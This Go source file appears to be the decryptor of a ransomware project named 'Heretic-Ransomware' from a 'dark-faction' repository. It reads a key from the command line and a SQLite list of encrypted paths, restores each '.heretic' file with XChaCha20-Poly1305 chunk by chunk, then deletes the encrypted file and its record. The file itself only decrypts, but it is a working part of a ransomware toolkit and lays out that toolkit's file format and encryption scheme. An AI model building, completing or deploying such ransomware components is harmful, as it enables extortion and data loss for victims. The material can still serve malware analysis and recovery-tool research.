package main

import (
	"fmt"
	"github.com/dark-faction/Heretic-Ransomware/internal/files"
	"github.com/dark-faction/Heretic-Ransomware/internal/startup"
	"golang.org/x/crypto/chacha20poly1305"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
	"io"
	"log"
	"os"
)

const (
	SaltSize  = 32        // in bytes
	chunkSize = 1024 * 32 // chunkSize in bytes. here, 32 KiB.
)

func main() {

	key := os.Args[1]

	db, err := gorm.Open(sqlite.Open("heretic.db"), &gorm.Config{})
	if err != nil {
		panic("failed to connect database")
	}

	var paths []startup.EncryptedFileInfo
	_ = db.Find(&paths)

	for _, path := range paths {

		decryptFile := fmt.Sprintf("%s.heretic", path.Path)

		// decrypt files
		infile, err := os.Open(decryptFile)
		if err != nil {
			log.Println("Error when opening input file.")
			panic(err)
		}
		//defer infile.Close()

		salt := make([]byte, SaltSize)
		n, err := infile.Read(salt)
		if n != SaltSize {
			log.Printf("Error. Salt should be %d bytes long. salt n : %d", SaltSize, n)
			log.Println("Another Error:", err)
			panic("Generated salt is not of required length")
		}
		if err == io.EOF {
			log.Println("Encountered EOF error.")
			panic(err)
		}
		if err != nil {
			log.Println("Error encountered :", err)
			panic(err)
		}

		aead, err := chacha20poly1305.NewX([]byte(key))
		decbufsize := aead.NonceSize() + chunkSize + aead.Overhead()

		outfile, err := os.OpenFile(path.Path, os.O_RDWR|os.O_CREATE, 0666)
		if err != nil {
			log.Println("Error when opening output file.")
			panic(err)
		}
		defer outfile.Close()

		buf := make([]byte, decbufsize)
		adCounter := 0 // associated data is a counter

		for {
			n, err := infile.Read(buf)
			if n > 0 {
				encryptedMsg := buf[:n]
				if len(encryptedMsg) < aead.NonceSize() {
					log.Println("Error. Ciphertext is too short.")
					panic("Ciphertext too short")
				}

				// Split nonce and ciphertext.
				nonce, ciphertext := encryptedMsg[:aead.NonceSize()], encryptedMsg[aead.NonceSize():]

				// Decrypt the message and check it wasn't tampered with.
				plaintext, err := aead.Open(nil, nonce, ciphertext, []byte(string(rune(adCounter))))
				if err != nil {
					log.Println("Error when decrypting ciphertext. May be wrong password or file is damaged.")
					panic(err)
				}

				_, _ = outfile.Write(plaintext)
			}
			if err == io.EOF {
				break
			}
			if err != nil {
				log.Printf("Error encountered. Read %d bytes: %v", n, err)
				panic(err)
			}

			adCounter += 1
		}

		files.Remove(decryptFile)
		var users []startup.EncryptedFileInfo
		db.Clauses(clause.Returning{}).Where("path = ?", path.Path).Delete(&users)
	}

}
